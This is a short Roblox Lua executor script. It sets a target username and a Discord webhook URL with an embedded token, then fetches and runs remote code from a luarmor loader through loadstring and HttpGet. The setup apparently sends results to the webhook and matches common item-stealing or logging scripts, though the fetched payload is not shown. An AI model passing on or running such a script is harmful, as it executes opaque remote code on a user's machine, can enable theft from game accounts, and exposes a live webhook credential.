-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "lafolieeu92"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1552679317920813157/CjX7BFidNZTWjHbDiCidHs4MmYf4uIUy8OlXB-9aRPDTMd8gl2MzMNuXI0rhrb1QNL_h"
...
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8aa20252c5f61cc3654a65dc62c19961.lua"))()
end)